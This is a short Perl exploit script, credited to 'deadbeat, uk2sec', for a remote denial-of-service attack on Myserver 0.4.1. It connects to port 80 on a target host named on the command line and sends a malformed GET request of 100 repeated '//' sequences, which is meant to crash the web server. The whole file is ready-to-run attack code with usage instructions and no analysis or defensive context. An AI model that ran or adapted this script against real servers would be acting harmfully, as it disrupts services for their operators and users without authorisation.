#!/usr/bin/perl

#Myserver 0.4.1 Remote Denial of service ;)
#oh joy...
#deadbeat, uk2sec
#eip@oakey.no-ip.com
#deadbeat@sdf.lonestar.org

use IO::Socket;
$dos = "//"x100;
$request = "GET $dos"."HTTP/1.0\r\n\r\n";

$target = $ARGV[0];

print "\n\nMyserver 0.4.1 Remote Denial Of Service..\n";
print "deadbeat, uk2sec..\n";
print "usage: perl $0 <target>\n";
$sox = IO::Socket::INET->new(
        Proto=>"tcp",
        PeerPort=>"80",
        PeerAddr=>"$target"
)or die "\nCan't connect to $target..\n";
print $sox $request;
sleep 2;
close $sox;
print "Done...\n";

